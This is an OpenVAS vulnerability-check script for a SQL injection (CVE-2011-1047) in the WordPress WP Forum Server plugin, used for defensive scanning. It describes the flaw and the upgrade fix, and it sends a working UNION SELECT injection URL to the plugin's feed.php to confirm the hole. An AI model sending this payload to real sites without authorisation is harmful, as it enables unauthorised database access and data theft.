###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_wp_forum_server_plugin_sql_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# WordPress WP Forum Server 'topic' Parameter SQL Injection Vulnerability
#
# Authors:
# Veerendra GG <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802006");
  script_version("$Revision: 11997 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-03-10 13:33:28 +0100 (Thu, 10 Mar 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2011-1047");
  script_name("WordPress WP Forum Server 'topic' Parameter SQL Injection Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/16235/");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/98715/");
  script_xref(name:"URL", value:"http://www.htbridge.ch/advisory/sql_injection_in_wp_forum_server_wordpress_plugin.html");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to perform SQL
  Injection attack and gain sensitive information.");

  script_tag(name:"affected", value:"WP Forum Server Wordpress plugin 1.6.5");

  script_tag(name:"insight", value:"The flaws are caused by improper validation of user-supplied
  input via the 'topic' parameter to '/wp-content/plugins/forum-server/feed.php',
  which allows attackers to manipulate SQL queries by injecting arbitrary SQL code.");

  script_tag(name:"solution", value:"Upgrade to WP Forum Server Wordpress plugin version 1.6.6 or later.");

  script_tag(name:"summary", value:"This host is installed with WordPress WP Forum Server plugin
  and is prone to SQL injection vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://wordpress.org/extend/plugins/forum-server/");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE))exit(0);
if(!dir = get_app_location(cpe:CPE, port:port))exit(0);

if(dir == "/") dir = "";
url = dir + "/wp-content/plugins/forum-server/feed.php?topic=1%20union%20select%20version%28%29%20--";

if(http_vuln_check(port:port, url:url, pattern:"<title>.* Topic:  [0-9]+\.[0-9a-zA-Z\.]+ ?</title>", check_header:TRUE)){
  report = report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);